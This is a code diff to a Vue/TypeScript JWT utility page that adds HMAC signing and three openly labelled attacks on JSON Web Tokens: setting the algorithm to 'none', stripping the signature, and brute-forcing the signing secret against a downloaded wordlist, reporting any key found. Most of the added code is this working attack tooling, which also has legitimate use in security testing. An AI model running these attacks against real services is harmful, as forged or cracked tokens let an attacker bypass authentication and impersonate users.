@@ -1,5 +1,7 @@
 <script setup lang="ts">
 import { onMounted, ref } from 'vue'
+import { jwtVerify, SignJWT } from 'jose'
+
 const algs = ref(["HS256", "HS384", "HS512", "RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512"])
 const selected_alg = ref("HS256")
 const sjwt = ref("")
@@ -8,6 +10,7 @@ const header = ref("")
 const payload = ref("")
 const verify_signature = ref("")
 const signature_type = ref("")
+const jwt_secret_key = ref("")
 
 const algs_map: { [key: string]: string } = {
     "HS256": `HMACSHA256(
@@ -130,7 +133,7 @@ const base64UrlEncode = (str: string) => {
     return base64.replace(/=+$/, ''); // 去掉填充字符
 }
 
-const encodeJwt = () => {
+const encodeJwt = async () => {
     let t = ""
     try {
         let h = header.value
@@ -146,10 +149,21 @@ const encodeJwt = () => {
         }
 
         let s = verify_signature.value
-        if (s) {
+        if (h && p && s) {
             t += "." + s
         }
 
+        if (jwt_secret_key.value && h && p) {
+            // 使用 jose 库进行签名
+            const secret = new TextEncoder().encode(
+                jwt_secret_key.value,
+            )
+
+            const jwt = await new SignJWT(JSON.parse(payload.value))
+                .setProtectedHeader(JSON.parse(header.value))
+                .sign(secret)
+            t = jwt
+        }
         tjwt.value = t
     } catch (e) {
         alert("Invalid Modified JWT format!")
@@ -161,12 +175,81 @@ const clearJwt = () => {
     header.value = ""
     payload.value = ""
     signature_type.value = ""
+    jwt_secret_key.value = ""
 }
 
-onMounted(() => {
-    sjwt.value = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.7aB3f5gF-3B44E8aWo063ryJYjOmZEvjkMbSXRfyos4"
+const none_attack = () => {
+    let h = JSON.parse(header.value)
+    if (h.alg) {
+        h.alg = "none"
+        header.value = JSON.stringify(h, null, 2)
+        encodeJwt()
+    }
+}
+const no_sign_attack = () => {
+    verify_signature.value = ""
+    none_attack()
+    tjwt.value += "."
+}
+
+const brute_force_attack = async () => {
+    let t = sjwt.value;  // 获取目标 JWT
+    const batchSize = 20;  // 每次并发处理的数量
+    try {
+        // 获取密钥列表并过滤空行或无效密钥
+        let f = await fetch("jwt.secrets.list");
+        let list = await f.text();
+        let keys = list.split("\n").map(key => key.trim()).filter(key => key.length > 0);  // 过滤空行
+
+        // 将密钥列表分批，每批包含最多 20 个密钥
+        const batches = [];
+        for (let i = 0; i < keys.length; i += batchSize) {
+            batches.push(keys.slice(i, i + batchSize));
+        }
+
+        // 处理每个批次
+        for (const batch of batches) {
+            const promises = batch.map((k) => {
+                return new Promise((resolve, reject) => {
+                    try {
+                        // 使用 jose 进行 JWT 验证
+                        jwtVerify(t, new TextEncoder().encode(k))
+                            .then(() => resolve(k))  // 如果验证成功，返回密钥
+                            .catch(() => resolve(null));  // 如果验证失败，返回 null
+                    } catch (e) {
+                        resolve(null);  // 捕获任何异常并返回 null
+                    }
+                });
+            });
+
+            // 等待当前批次的验证完成
+            const results = await Promise.all(promises);
+
+            // 检查当前批次中是否找到有效的密钥
+            const foundKey = results.find(result => result);
+            if (foundKey) {
+                alert(`Success! Secret Key: ${foundKey}`);  // 找到密钥后弹窗
+                jwt_secret_key.value = foundKey as string;  // 将密钥保存到组件状态中
+                return;  // 一旦找到密钥，结束整个暴力破解
+            }
+        }
+
+        // 如果没有找到密钥
+        alert("No valid secret key found.");
+
+    } catch (err) {
+        console.error("Error during brute force attack:", err);
+        alert("An error occurred during the attack.");
+    }
+};
+
+onMounted(async () => {
+    sjwt.value = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.CQ13a7rjONXqoy8ARzP8oyKBI2PMNl7z76FCvuKVxo0"
+    jwt_secret_key.value = "secure"
     decodeJwt()
     encodeJwt()
+    // const res = await fetch("jwt.secrets.list")
+    // let list = await res.text()
 })
 </script>
 <template>
@@ -190,7 +273,8 @@ onMounted(() => {
 
 
                 <div class="w-33"></div>
-
+                <v-text-field class="mr-4" v-model="jwt_secret_key" label="Secret Key" variant="outlined"
+                    @blur="encodeJwt"></v-text-field>
                 <v-select width="100px" label="Alg" v-model="selected_alg" :items=algs variant="outlined"
                     @vue:mounted="select_alg" @update:model-value="select_alg"></v-select>
             </div>
@@ -209,7 +293,13 @@ onMounted(() => {
 
 
             <v-textarea rows="5" label="T-JWT" variant="outlined" no-resize v-model="tjwt"></v-textarea>
-
+            <div class="d-flex">
+                <v-btn @click="none_attack">None</v-btn>
+                <v-btn class="ml-4" @click="no_sign_attack">No Sign</v-btn>
+                <v-btn class="ml-4" @click="brute_force_attack">Brute</v-btn>
+            </div>
+            <p class="mt-4">Dictionary: <a
+                    href="https://github.com/wallarm/jwt-secrets">https://github.com/wallarm/jwt-secrets</a></p>
 
         </div>
 
